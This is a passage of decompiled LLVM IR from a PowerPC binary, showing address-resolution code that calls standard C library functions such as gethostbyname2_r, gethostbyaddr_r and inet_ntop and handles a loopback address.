  %v1_1001cf0c = call i32 @__asm_rlwinm(i32 %v1_1001cf04, i32 0, i32 0, i32 27)
  store i32 2, i32* @r4, align 4
  %v1_1001cf14 = sub i32 0, %v1_1001cf0c
  store i32 %v1_1001cf14, i32* %r0.global-to-local, align 4
  store i32 %v2_1001cf18, i32* @r5, align 4
  %v0_1001cf1c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001cf1c = load i32, i32* @r1, align 4
  %v3_1001cf1c = sub i32 %v1_1001cf1c, %v1_1001cf0c
  %v4_1001cf1c = inttoptr i32 %v3_1001cf1c to i32*
  store i32 %v0_1001cf1c, i32* %v4_1001cf1c, align 4
  %v0_1001cf20 = load i32, i32* @r29, align 4
  store i32 %v0_1001cf20, i32* @r7, align 4
  store i32 %v2_1001cf24, i32* @r8, align 4
  store i32 %v2_1001cf28, i32* @r9, align 4
  %v1_1001cf2c = add i32 %v3_1001cf1c, 23
  %v1_1001cf30 = call i32 @__asm_rlwinm(i32 %v1_1001cf2c, i32 0, i32 0, i32 27)
  store i32 %v1_1001cf30, i32* @r6, align 4
  store i32 268554040, i32* @lr, align 4
  %v1_1001cf34 = call i32 @gethostbyname2_r(i32 %v1_1001cf30)
  %v3_1001cf38 = icmp eq i32 %v1_1001cf34, 34
  br i1 %v3_1001cf38, label %dec_label_pc_1001cf40, label %dec_label_pc_1001cf50

dec_label_pc_1001cf40:                            ; preds = %dec_label_pc_1001cefc
  %v3_1001cf40 = load i32, i32* %stack_var_-160, align 4
  store i32 %v3_1001cf40, i32* %r0.global-to-local, align 4
  %v3_1001cf44 = icmp eq i32 %v3_1001cf40, -1
  br i1 %v3_1001cf44, label %dec_label_pc_1001cf40.dec_label_pc_1001cefc_crit_edge, label %dec_label_pc_1001cf58

dec_label_pc_1001cf40.dec_label_pc_1001cefc_crit_edge: ; preds = %dec_label_pc_1001cf40
  %v0_1001cefc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001cefc

dec_label_pc_1001cf50:                            ; preds = %dec_label_pc_1001cefc
  %v3_1001cf50 = icmp eq i32 %v1_1001cf34, 0
  br i1 %v3_1001cf50, label %dec_label_pc_1001cf90, label %dec_label_pc_1001cf50.dec_label_pc_1001cf58_crit_edge

dec_label_pc_1001cf50.dec_label_pc_1001cf58_crit_edge: ; preds = %dec_label_pc_1001cf50
  %v3_1001cf58.pre = load i32, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1001cf58

dec_label_pc_1001cf58:                            ; preds = %dec_label_pc_1001cf40, %dec_label_pc_1001cf50.dec_label_pc_1001cf58_crit_edge
  %v0_1001cf80 = phi i32 [ %v3_1001cf58.pre, %dec_label_pc_1001cf50.dec_label_pc_1001cf58_crit_edge ], [ %v3_1001cf40, %dec_label_pc_1001cf40 ]
  store i32 %v0_1001cf80, i32* %r29.global-to-local, align 4
  %v3_1001cf5c = icmp eq i32 %v0_1001cf80, -1
  br i1 %v3_1001cf5c, label %dec_label_pc_1001cf64, label %dec_label_pc_1001cf74

dec_label_pc_1001cf64:                            ; preds = %dec_label_pc_1001cf58, %dec_label_pc_1001cde4
  %v0_1001cf64 = call i32 @__GI___h_errno_location()
  store i32 11, i32* %r9.global-to-local, align 4
  %v0_1001cf6c = load i32, i32* %r29.global-to-local, align 4
  %v2_1001cf6c = inttoptr i32 %v0_1001cf64 to i32*
  store i32 %v0_1001cf6c, i32* %v2_1001cf6c, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001cf74:                            ; preds = %dec_label_pc_1001cf58
  %v3_1001cf74 = icmp eq i32 %v0_1001cf80, 2
  store i32 -3, i32* %r0.global-to-local, align 4
  br i1 %v3_1001cf74, label %dec_label_pc_1001d030, label %dec_label_pc_1001cf80

dec_label_pc_1001cf80:                            ; preds = %dec_label_pc_1001cf74
  %v1_1001cf80 = xor i32 %v0_1001cf80, 4
  %v1_1001cf84 = call i32 @llvm.ctlz.i32(i32 %v1_1001cf80, i1 true)
  store i32 %v1_1001cf84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001d028.thread

dec_label_pc_1001cf90:                            ; preds = %dec_label_pc_1001cf50
  %v3_1001cf90 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001cf90 = ptrtoint i8* %v3_1001cf90 to i32
  store i32 %v4_1001cf90, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v3_1001cf98 = icmp eq i8* %v3_1001cf90, null
  br i1 %v3_1001cf98, label %dec_label_pc_1001d050, label %dec_label_pc_1001d000

dec_label_pc_1001cfa4:                            ; preds = %dec_label_pc_1001d000
  %v0_1001cfa4 = load i32, i32* @r28, align 4
  %v1_1001cfa4 = inttoptr i32 %v0_1001cfa4 to i32*
  %v2_1001cfa4 = load i32, i32* %v1_1001cfa4, align 4
  store i32 %v2_1001cfa4, i32* %r11.global-to-local, align 4
  %v3_1001cfa8 = icmp eq i32 %v2_1001cfa4, 0
  br i1 %v3_1001cfa8, label %dec_label_pc_1001cfb0, label %dec_label_pc_1001cfcc

dec_label_pc_1001cfb0:                            ; preds = %dec_label_pc_1001cfa4
  %v0_1001cfb0 = load i32, i32* @r1, align 4
  %v1_1001cfb0 = inttoptr i32 %v0_1001cfb0 to i32*
  %v2_1001cfb0 = load i32, i32* %v1_1001cfb0, align 4
  %v2_1001cfb4 = add i32 %v0_1001cfb0, -48
  %v3_1001cfb4 = inttoptr i32 %v2_1001cfb4 to i32*
  store i32 %v2_1001cfb0, i32* %v3_1001cfb4, align 4
  %v1_1001cfb8 = add i32 %v0_1001cfb0, -25
  store i32 %v1_1001cfb8, i32* %r0.global-to-local, align 4
  %v1_1001cfbc = call i32 @__asm_rlwinm(i32 %v1_1001cfb8, i32 0, i32 0, i32 27)
  store i32 %v1_1001cfbc, i32* %r0.global-to-local, align 4
  store i32 %v1_1001cfbc, i32* %r9.global-to-local, align 4
  %v1_1001cfc4 = load i32, i32* @r28, align 4
  %v2_1001cfc4 = inttoptr i32 %v1_1001cfc4 to i32*
  store i32 %v1_1001cfbc, i32* %v2_1001cfc4, align 4
  %v0_1001cfc8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001cfc8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001cfc8 = add i32 %v1_1001cfc8, 24
  %v3_1001cfc8 = inttoptr i32 %v2_1001cfc8 to i32*
  store i32 %v0_1001cfc8, i32* %v3_1001cfc8, align 4
  %v0_1001cfcc.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001cfcc

dec_label_pc_1001cfcc:                            ; preds = %dec_label_pc_1001cfa4, %dec_label_pc_1001cfb0
  %v0_1001cfcc = phi i32 [ %v0_1001cfa4, %dec_label_pc_1001cfa4 ], [ %v0_1001cfcc.pre, %dec_label_pc_1001cfb0 ]
  %v1_1001cfcc = inttoptr i32 %v0_1001cfcc to i32*
  %v2_1001cfcc = load i32, i32* %v1_1001cfcc, align 4
  store i32 %v2_1001cfcc, i32* %r9.global-to-local, align 4
  %v2_1001cfd4 = inttoptr i32 %v2_1001cfcc to i32*
  store i32 0, i32* %v2_1001cfd4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001cfdc = load i32, i32* @r28, align 4
  %v1_1001cfdc = inttoptr i32 %v0_1001cfdc to i32*
  %v2_1001cfdc = load i32, i32* %v1_1001cfdc, align 4
  %v2_1001cfe0 = add i32 %v2_1001cfdc, 4
  %v3_1001cfe0 = inttoptr i32 %v2_1001cfe0 to i32*
  store i32 2, i32* %v3_1001cfe0, align 4
  %v3_1001cfe4 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001cfe4 = ptrtoint i8* %v3_1001cfe4 to i32
  store i32 %v4_1001cfe4, i32* %r9.global-to-local, align 4
  %v0_1001cfe8 = load i32, i32* @r28, align 4
  %v1_1001cfe8 = inttoptr i32 %v0_1001cfe8 to i32*
  %v2_1001cfe8 = load i32, i32* %v1_1001cfe8, align 4
  %v1_1001cfec = add i32 %v4_1001cfe4, 16
  %v2_1001cfec = inttoptr i32 %v1_1001cfec to i32*
  %v3_1001cfec = load i32, i32* %v2_1001cfec, align 4
  store i32 %v3_1001cfec, i32* %r9.global-to-local, align 4
  %v1_1001cff0 = add i32 %v2_1001cfe8, 8
  store i32 %v1_1001cff0, i32* @r3, align 4
  %v1_1001cff4 = load i32, i32* @r10, align 4
  %v2_1001cff4 = add i32 %v1_1001cff4, %v3_1001cfec
  %v3_1001cff4 = inttoptr i32 %v2_1001cff4 to i32*
  %v4_1001cff4 = load i32, i32* %v3_1001cff4, align 4
  store i32 %v4_1001cff4, i32* @r4, align 4
  store i32 268554236, i32* @lr, align 4
  %v0_1001cff8 = call i32 @memcpy()
  %v0_1001cffc = load i32, i32* @r28, align 4
  %v1_1001cffc = inttoptr i32 %v0_1001cffc to i32*
  %v2_1001cffc = load i32, i32* %v1_1001cffc, align 4
  store i32 %v2_1001cffc, i32* @r28, align 4
  %v3_1001d000.pre = load i8*, i8** %stack_var_-156, align 4
  %v0_1001d004.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001d000

dec_label_pc_1001d000:                            ; preds = %dec_label_pc_1001cf90, %dec_label_pc_1001cfcc
  %v0_1001d004 = phi i32 [ %v0_1001d004.pre, %dec_label_pc_1001cfcc ], [ 0, %dec_label_pc_1001cf90 ]
  %v3_1001d000 = phi i8* [ %v3_1001d000.pre, %dec_label_pc_1001cfcc ], [ %v3_1001cf90, %dec_label_pc_1001cf90 ]
  %v4_1001d000 = ptrtoint i8* %v3_1001d000 to i32
  store i32 %v4_1001d000, i32* %r9.global-to-local, align 4
  %v1_1001d004 = mul i32 %v0_1001d004, 4
  store i32 %v1_1001d004, i32* @r10, align 4
  store i32 4, i32* @r5, align 4
  %v1_1001d00c = add i32 %v0_1001d004, 1
  store i32 %v1_1001d00c, i32* %r30.global-to-local, align 4
  %v1_1001d010 = add i32 %v4_1001d000, 16
  %v2_1001d010 = inttoptr i32 %v1_1001d010 to i32*
  %v3_1001d010 = load i32, i32* %v2_1001d010, align 4
  store i32 %v3_1001d010, i32* %r9.global-to-local, align 4
  %v2_1001d014 = add i32 %v3_1001d010, %v1_1001d004
  %v3_1001d014 = inttoptr i32 %v2_1001d014 to i32*
  %v4_1001d014 = load i32, i32* %v3_1001d014, align 4
  store i32 %v4_1001d014, i32* %r0.global-to-local, align 4
  %v3_1001d018 = icmp eq i32 %v4_1001d014, 0
  br i1 %v3_1001d018, label %dec_label_pc_1001d050, label %dec_label_pc_1001cfa4

dec_label_pc_1001d028.thread:                     ; preds = %dec_label_pc_1001cf80, %dec_label_pc_1001ceec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001d050

dec_label_pc_1001d028:                            ; preds = %dec_label_pc_1001ced0
  store i32 %v0_1001d024, i32* %r0.global-to-local, align 4
  %v3_1001d028 = icmp eq i32 %v0_1001d024, 0
  br i1 %v3_1001d028, label %dec_label_pc_1001d050, label %dec_label_pc_1001d038

dec_label_pc_1001d030:                            ; preds = %dec_label_pc_1001cf74
  %v0_1001d030.pre = load i32, i32* @r30, align 4
  %v3_1001d030 = icmp eq i32 %v0_1001d030.pre, 0
  br i1 %v3_1001d030, label %dec_label_pc_1001d050, label %dec_label_pc_1001d038.thread

dec_label_pc_1001d038.thread:                     ; preds = %dec_label_pc_1001d030
  %phitmp = icmp eq i32 %v0_1001d030.pre, -3
  br label %dec_label_pc_1001d040

dec_label_pc_1001d038:                            ; preds = %dec_label_pc_1001d028
  %v3_1001d038 = icmp eq i32 %v0_1001d024, -3
  br i1 %v3_1001d038, label %dec_label_pc_1001d040, label %dec_label_pc_1001d3cc

dec_label_pc_1001d040:                            ; preds = %dec_label_pc_1001d038.thread, %dec_label_pc_1001d038
  %v0_1001d030108112 = phi i1 [ %phitmp, %dec_label_pc_1001d038.thread ], [ true, %dec_label_pc_1001d038 ]
  store i32 3, i32* %r9.global-to-local, align 4
  br i1 %v0_1001d030108112, label %dec_label_pc_1001d3f0, label %dec_label_pc_1001d3cc

dec_label_pc_1001d050:                            ; preds = %dec_label_pc_1001d000, %dec_label_pc_1001d028.thread, %dec_label_pc_1001cf90, %dec_label_pc_1001cd54, %dec_label_pc_1001cd44, %dec_label_pc_1001d030, %dec_label_pc_1001d028
  %v3_1001d050 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d050, i32* %r9.global-to-local, align 4
  %v1_1001d054 = add i32 %v3_1001d050, 4
  %v2_1001d054 = inttoptr i32 %v1_1001d054 to i32*
  %v3_1001d054 = load i32, i32* %v2_1001d054, align 4
  store i32 %v3_1001d054, i32* %r0.global-to-local, align 4
  %v3_1001d058 = icmp eq i32 %v3_1001d054, 0
  br i1 %v3_1001d058, label %dec_label_pc_1001d3c4, label %dec_label_pc_1001d140

dec_label_pc_1001d064:                            ; preds = %dec_label_pc_1001cbb4
  store i32 0, i32* @r4, align 4
  store i32 28, i32* @r5, align 4
  %v2_1001d070 = ptrtoint i32* %stack_var_-233 to i32
  store i32 %v2_1001d070, i32* %r0.global-to-local, align 4
  %v1_1001d074 = call i32 @__asm_rlwinm(i32 %v2_1001d070, i32 0, i32 0, i32 27)
  store i32 %v1_1001d074, i32* %r0.global-to-local, align 4
  store i32 %v1_1001d074, i32* @r3, align 4
  store i32 %v1_1001d074, i32* %r30.global-to-local, align 4
  store i32 %v1_1001d074, i32* %stack_var_-164, align 4
  store i32 268554376, i32* @lr, align 4
  %v0_1001d084 = call i32 @__GI_memset()
  %v0_1001d088 = load i32, i32* @r27, align 4
  %v1_1001d088 = add i32 %v0_1001d088, 4
  %v2_1001d088 = inttoptr i32 %v1_1001d088 to i32*
  %v3_1001d088 = load i32, i32* %v2_1001d088, align 4
  store i32 %v3_1001d088, i32* %r0.global-to-local, align 4
  %v3_1001d08c = icmp eq i32 %v3_1001d088, 0
  br i1 %v3_1001d08c, label %dec_label_pc_1001d094, label %dec_label_pc_1001d0c0

dec_label_pc_1001d094:                            ; preds = %dec_label_pc_1001d064
  store i32 0, i32* @r4, align 4
  %v3_1001d09c = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d09c, i32* %r9.global-to-local, align 4
  store i32 28, i32* @r5, align 4
  %v2_1001d0a8 = ptrtoint i32* %stack_var_-281 to i32
  store i32 %v2_1001d0a8, i32* %r0.global-to-local, align 4
  %v1_1001d0ac = call i32 @__asm_rlwinm(i32 %v2_1001d0a8, i32 0, i32 0, i32 27)
  store i32 %v1_1001d0ac, i32* %r0.global-to-local, align 4
  %v1_1001d0b0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001d0b0 = inttoptr i32 %v1_1001d0b0 to i32*
  store i32 %v1_1001d0ac, i32* %v2_1001d0b0, align 4
  %v3_1001d0b4 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d0b4, i32* %r9.global-to-local, align 4
  %v1_1001d0b8 = inttoptr i32 %v3_1001d0b4 to i32*
  %v2_1001d0b8 = load i32, i32* %v1_1001d0b8, align 4
  store i32 %v2_1001d0b8, i32* @r3, align 4
  store i32 268554432, i32* @lr, align 4
  %v0_1001d0bc = call i32 @__GI_memset()
  %v0_1001d0c0.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1001d0c0

dec_label_pc_1001d0c0:                            ; preds = %dec_label_pc_1001d064, %dec_label_pc_1001d094
  %v0_1001d0c0 = phi i32 [ %v0_1001d088, %dec_label_pc_1001d064 ], [ %v0_1001d0c0.pre, %dec_label_pc_1001d094 ]
  %v1_1001d0c0 = add i32 %v0_1001d0c0, 4
  %v2_1001d0c0 = inttoptr i32 %v1_1001d0c0 to i32*
  %v3_1001d0c0 = load i32, i32* %v2_1001d0c0, align 4
  store i32 %v3_1001d0c0, i32* %r0.global-to-local, align 4
  %v3_1001d0c4 = icmp eq i32 %v3_1001d0c0, 0
  br i1 %v3_1001d0c4, label %dec_label_pc_1001d0d4, label %dec_label_pc_1001d0cc

dec_label_pc_1001d0cc:                            ; preds = %dec_label_pc_1001d0c0
  %v3_1001d0cc = icmp eq i32 %v3_1001d0c0, 10
  br i1 %v3_1001d0cc, label %dec_label_pc_1001d0d4, label %dec_label_pc_1001d10c

dec_label_pc_1001d0d4:                            ; preds = %dec_label_pc_1001d0cc, %dec_label_pc_1001d0c0
  %v3_1001d0d4 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d0d4, i32* %r9.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v2_1001d0dc = add i32 %v3_1001d0d4, 4
  %v3_1001d0dc = inttoptr i32 %v2_1001d0dc to i32*
  store i32 10, i32* %v3_1001d0dc, align 4
  %v0_1001d0e0 = load i32, i32* @r27, align 4
  %v1_1001d0e0 = inttoptr i32 %v0_1001d0e0 to i32*
  %v2_1001d0e0 = load i32, i32* %v1_1001d0e0, align 4
  store i32 %v2_1001d0e0, i32* %r0.global-to-local, align 4
  %v1_1001d0e4 = urem i32 %v2_1001d0e0, 2
  store i32 %v1_1001d0e4, i32* %r9.global-to-local, align 4
  %v3_1001d0e4 = icmp eq i32 %v1_1001d0e4, 0
  br i1 %v3_1001d0e4, label %dec_label_pc_1001d0ec, label %dec_label_pc_1001d104

dec_label_pc_1001d0ec:                            ; preds = %dec_label_pc_1001d0d4
  %v3_1001d0ec = load i32, i32* %stack_var_-164, align 4
  store i32 ptrtoint (i32* @global_var_1002f084.1190 to i32), i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  %v1_1001d0fc = add i32 %v3_1001d0ec, 8
  store i32 %v1_1001d0fc, i32* @r3, align 4
  store i32 268554500, i32* @lr, align 4
  %v0_1001d100 = call i32 @memcpy()
  %v0_1001d10c.pre.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1001d104

dec_label_pc_1001d104:                            ; preds = %dec_label_pc_1001d0d4, %dec_label_pc_1001d0ec
  %v0_1001d10c.pre = phi i32 [ %v0_1001d0e0, %dec_label_pc_1001d0d4 ], [ %v0_1001d10c.pre.pre, %dec_label_pc_1001d0ec ]
  %v3_1001d104 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d104, i32* %r9.global-to-local, align 4
  %v1_1001d108 = inttoptr i32 %v3_1001d104 to i32*
  %v2_1001d108 = load i32, i32* %v1_1001d108, align 4
  store i32 %v2_1001d108, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001d10c

dec_label_pc_1001d10c:                            ; preds = %dec_label_pc_1001d0cc, %dec_label_pc_1001d104
  %v0_1001d10c = phi i32 [ %v0_1001d0c0, %dec_label_pc_1001d0cc ], [ %v0_1001d10c.pre, %dec_label_pc_1001d104 ]
  %v1_1001d10c = add i32 %v0_1001d10c, 4
  %v2_1001d10c = inttoptr i32 %v1_1001d10c to i32*
  %v3_1001d10c = load i32, i32* %v2_1001d10c, align 4
  store i32 %v3_1001d10c, i32* %r0.global-to-local, align 4
  %v3_1001d110 = icmp eq i32 %v3_1001d10c, 0
  br i1 %v3_1001d110, label %dec_label_pc_1001d120, label %dec_label_pc_1001d118

dec_label_pc_1001d118:                            ; preds = %dec_label_pc_1001d10c
  %v3_1001d118 = icmp eq i32 %v3_1001d10c, 2
  br i1 %v3_1001d118, label %dec_label_pc_1001d120, label %dec_label_pc_1001d140

dec_label_pc_1001d120:                            ; preds = %dec_label_pc_1001d118, %dec_label_pc_1001d10c
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1001d124 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001d124 = add i32 %v1_1001d124, 4
  %v3_1001d124 = inttoptr i32 %v2_1001d124 to i32*
  store i32 2, i32* %v3_1001d124, align 4
  %v0_1001d128 = load i32, i32* @r27, align 4
  %v1_1001d128 = inttoptr i32 %v0_1001d128 to i32*
  %v2_1001d128 = load i32, i32* %v1_1001d128, align 4
  store i32 %v2_1001d128, i32* %r0.global-to-local, align 4
  %v1_1001d12c = urem i32 %v2_1001d128, 2
  store i32 %v1_1001d12c, i32* %r9.global-to-local, align 4
  %v3_1001d12c = icmp eq i32 %v1_1001d12c, 0
  br i1 %v3_1001d12c, label %dec_label_pc_1001d134, label %dec_label_pc_1001d140

dec_label_pc_1001d134:                            ; preds = %dec_label_pc_1001d120
  store i32 2130706433, i32* %r0.global-to-local, align 4
  %v1_1001d13c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001d13c = add i32 %v1_1001d13c, 8
  %v3_1001d13c = inttoptr i32 %v2_1001d13c to i32*
  store i32 2130706433, i32* %v3_1001d13c, align 4
  br label %dec_label_pc_1001d140

dec_label_pc_1001d140:                            ; preds = %dec_label_pc_1001d120, %dec_label_pc_1001d118, %dec_label_pc_1001d050, %dec_label_pc_1001d134
  %v0_1001d140 = load i32, i32* @r25, align 4
  %v3_1001d140 = icmp eq i32 %v0_1001d140, 0
  br i1 %v3_1001d140, label %dec_label_pc_1001d3ec, label %dec_label_pc_1001d148

dec_label_pc_1001d148:                            ; preds = %dec_label_pc_1001d140
  %v3_1001d148 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d148, i32* @r28, align 4
  store i32 0, i32* @r26, align 4
  %v3_1001d3a814 = icmp eq i32 %v3_1001d148, 0
  br i1 %v3_1001d3a814, label %dec_label_pc_1001d3ec, label %dec_label_pc_1001d154.lr.ph

dec_label_pc_1001d154.lr.ph:                      ; preds = %dec_label_pc_1001d148
  %v2_1001d184 = ptrtoint i32* %stack_var_-136 to i32
  %v2_1001d194 = ptrtoint i8** %stack_var_-156 to i32
  %v2_1001d198 = ptrtoint i32* %stack_var_-160 to i32
  %v2_1001d20c = ptrtoint i32* %stack_var_-116 to i32
  br label %dec_label_pc_1001d154

dec_label_pc_1001d154:                            ; preds = %dec_label_pc_1001d154.lr.ph, %dec_label_pc_1001d3a4
  %v0_1001d17c54 = phi i32 [ %v3_1001d148, %dec_label_pc_1001d154.lr.ph ], [ %v2_1001d3a4, %dec_label_pc_1001d3a4 ]
  %v0_1001d154 = load i32, i32* @r27, align 4
  %v1_1001d154 = inttoptr i32 %v0_1001d154 to i32*
  %v2_1001d154 = load i32, i32* %v1_1001d154, align 4
  store i32 %v2_1001d154, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r22.global-to-local, align 4
  %v1_1001d15c = and i32 %v2_1001d154, 2
  store i32 %v1_1001d15c, i32* %r11.global-to-local, align 4
  %v3_1001d15c = icmp eq i32 %v1_1001d15c, 0
  br i1 %v3_1001d15c, label %dec_label_pc_1001d238, label %dec_label_pc_1001d164

dec_label_pc_1001d164:                            ; preds = %dec_label_pc_1001d154
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 512, i32* %r29.global-to-local, align 4
  store i32 0, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1001d170

dec_label_pc_1001d170:                            ; preds = %dec_label_pc_1001d1d8.dec_label_pc_1001d170_crit_edge, %dec_label_pc_1001d164
  %v0_1001d17c = phi i32 [ %v0_1001d17c.pre, %dec_label_pc_1001d1d8.dec_label_pc_1001d170_crit_edge ], [ %v0_1001d17c54, %dec_label_pc_1001d164 ]
  %v0_1001d170 = phi i32 [ %v0_1001d170.pre, %dec_label_pc_1001d1d8.dec_label_pc_1001d170_crit_edge ], [ 512, %dec_label_pc_1001d164 ]
  %v1_1001d170 = mul i32 %v0_1001d170, 2
  store i32 %v1_1001d170, i32* %r29.global-to-local, align 4
  %v2_1001d174 = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001d174, i32* %r9.global-to-local, align 4
  %v1_1001d178 = add i32 %v1_1001d170, 30
  store i32 %v1_1001d178, i32* %r0.global-to-local, align 4
  %v1_1001d17c = add i32 %v0_1001d17c, 8
  store i32 %v1_1001d17c, i32* %r26.global-to-local, align 4
  %v1_1001d180 = call i32 @__asm_rlwinm(i32 %v1_1001d178, i32 0, i32 0, i32 27)
  store i32 %v2_1001d184, i32* @r6, align 4
  %v1_1001d188 = sub i32 0, %v1_1001d180
  store i32 %v1_1001d188, i32* %r0.global-to-local, align 4
  %v0_1001d18c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001d18c, i32* @r8, align 4
  %v0_1001d190 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d190 = load i32, i32* @r1, align 4
  %v3_1001d190 = sub i32 %v1_1001d190, %v1_1001d180
  %v4_1001d190 = inttoptr i32 %v3_1001d190 to i32*
  store i32 %v0_1001d190, i32* %v4_1001d190, align 4
  store i32 %v2_1001d194, i32* @r10, align 4
  store i32 %v2_1001d198, i32* @r9, align 4
  %v0_1001d1a0 = load i32, i32* @r28, align 4
  %v1_1001d1a0 = add i32 %v0_1001d1a0, 4
  %v2_1001d1a0 = inttoptr i32 %v1_1001d1a0 to i32*
  %v3_1001d1a0 = load i32, i32* %v2_1001d1a0, align 4
  store i32 %v3_1001d1a0, i32* @r5, align 4
  %v1_1001d1a4 = add i32 %v3_1001d190, 23
  %v1_1001d1a8 = call i32 @__asm_rlwinm(i32 %v1_1001d1a4, i32 0, i32 0, i32 27)
  store i32 %v1_1001d1a8, i32* @r7, align 4
  %v0_1001d1ac = load i32, i32* @r5, align 4
  %not.v2_1001d1b0 = icmp eq i32 %v0_1001d1ac, 10
  %v6_1001d1b4 = sext i1 %not.v2_1001d1b0 to i32
  store i32 %v6_1001d1b4, i32* %r4.global-to-local, align 4
  %v1_1001d1b8 = call i32 @__asm_rlwinm(i32 %v6_1001d1b4, i32 0, i32 28, i32 29)
  %v1_1001d1bc = add i32 %v1_1001d1b8, 4
  store i32 %v1_1001d1bc, i32* @r4, align 4
  store i32 268554692, i32* @lr, align 4
  %v1_1001d1c0 = inttoptr i32 %v1_1001d1bc to i8*
  %v2_1001d1c0 = call i32 @__GI_gethostbyaddr_r(i8* %v1_1001d1c0)
  store i32 %v2_1001d1c0, i32* @r30, align 4
  %v0_1001d1c8 = call i32 @__errno_location()
  %v1_1001d1cc = inttoptr i32 %v0_1001d1c8 to i32*
  %v2_1001d1cc = load i32, i32* %v1_1001d1cc, align 4
  store i32 %v2_1001d1cc, i32* %r0.global-to-local, align 4
  %v0_1001d1d0 = load i32, i32* @r30, align 4
  %v4_1001d1d0 = icmp eq i32 %v0_1001d1d0, %v2_1001d1cc
  br i1 %v4_1001d1d0, label %dec_label_pc_1001d1d8, label %dec_label_pc_1001d1e4

dec_label_pc_1001d1d8:                            ; preds = %dec_label_pc_1001d170
  %v3_1001d1d8 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001d1d8 = ptrtoint i8* %v3_1001d1d8 to i32
  store i32 %v4_1001d1d8, i32* %r0.global-to-local, align 4
  %v3_1001d1dc = icmp eq i8* %v3_1001d1d8, inttoptr (i32 -1 to i8*)
  br i1 %v3_1001d1dc, label %dec_label_pc_1001d1d8.dec_label_pc_1001d170_crit_edge, label %dec_label_pc_1001d1e4

dec_label_pc_1001d1d8.dec_label_pc_1001d170_crit_edge: ; preds = %dec_label_pc_1001d1d8
  %v0_1001d170.pre = load i32, i32* @r29, align 4
  %v0_1001d17c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001d170

dec_label_pc_1001d1e4:                            ; preds = %dec_label_pc_1001d170, %dec_label_pc_1001d1d8
  %v0_1001d1d0.lcssa = phi i32 [ %v0_1001d1d0, %dec_label_pc_1001d170 ], [ %v2_1001d1cc, %dec_label_pc_1001d1d8 ]
  %v3_1001d1e4 = icmp eq i32 %v0_1001d1d0.lcssa, 0
  br i1 %v3_1001d1e4, label %dec_label_pc_1001d1f8, label %dec_label_pc_1001d1ec

dec_label_pc_1001d1ec:                            ; preds = %dec_label_pc_1001d1e4
  %v3_1001d1ec = load i8*, i8** %stack_var_-156, align 4
  %v4_1001d1ec = ptrtoint i8* %v3_1001d1ec to i32
  store i32 %v4_1001d1ec, i32* @r30, align 4
  %v3_1001d1f0 = icmp eq i8* %v3_1001d1ec, inttoptr (i32 -1 to i8*)
  br i1 %v3_1001d1f0, label %dec_label_pc_1001d3d4, label %dec_label_pc_1001d1f8

dec_label_pc_1001d1f8:                            ; preds = %dec_label_pc_1001d1ec, %dec_label_pc_1001d1e4
  %v3_1001d1f8 = load i32, i32* %stack_var_-160, align 4
  %v3_1001d1fc = icmp eq i32 %v3_1001d1f8, 0
  br i1 %v3_1001d1fc, label %dec_label_pc_1001d204, label %dec_label_pc_1001d220

dec_label_pc_1001d204:                            ; preds = %dec_label_pc_1001d1f8
  %v0_1001d204 = load i32, i32* @r28, align 4
  %v1_1001d204 = add i32 %v0_1001d204, 4
  %v2_1001d204 = inttoptr i32 %v1_1001d204 to i32*
  %v3_1001d204 = load i32, i32* %v2_1001d204, align 4
  %v0_1001d208 = load i32, i32* @r26, align 4
  store i32 %v0_1001d208, i32* %r4.global-to-local, align 4
  store i32 268554776, i32* @lr, align 4
  %v4_1001d214 = call i32 @__GI_inet_ntop(i32 %v3_1001d204, i32 %v0_1001d208, i32 %v2_1001d20c, i32 46)
  br label %dec_label_pc_1001d224

dec_label_pc_1001d220:                            ; preds = %dec_label_pc_1001d1f8
  %v1_1001d220 = inttoptr i32 %v3_1001d1f8 to i32*
  %v2_1001d220 = load i32, i32* %v1_1001d220, align 4
  br label %dec_label_pc_1001d224

dec_label_pc_1001d224:                            ; preds = %dec_label_pc_1001d204, %dec_label_pc_1001d220
  %v0_1001d22c = phi i32 [ %v4_1001d214, %dec_label_pc_1001d204 ], [ %v2_1001d220, %dec_label_pc_1001d220 ]
  store i32 %v0_1001d22c, i32* @r26, align 4
  %v3_1001d224 = icmp eq i32 %v0_1001d22c, 0
  br i1 %v3_1001d224, label %dec_label_pc_1001d3c4, label %dec_label_pc_1001d22c

dec_label_pc_1001d22c:                            ; preds = %dec_label_pc_1001d224
  store i32 %v0_1001d22c, i32* @r3, align 4
  %v0_1001d230 = call i32 @__GI_strlen()
